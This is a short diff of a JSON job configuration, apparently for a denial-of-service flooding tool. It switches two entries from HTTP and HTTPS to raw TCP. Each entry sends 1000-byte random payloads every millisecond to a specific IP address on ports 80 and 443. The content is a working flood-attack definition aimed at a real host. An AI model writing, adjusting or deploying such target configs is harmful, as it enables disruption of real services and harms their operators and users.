@@ -8,21 +8,21 @@
         "body": "{{- random_payload 1000 -}}"
       }
     },
-     {
-      "type": "http",
+    {
+      "type": "tcp",
       "args": {
         "address": "178.248.233.32:80",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}"
       }
     },
-     {
-      "type": "https",
+    {
+      "type": "tcp",
       "args": {
         "address": "178.248.233.32:443",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}"
       }
-    },
+    }
   ]
 }
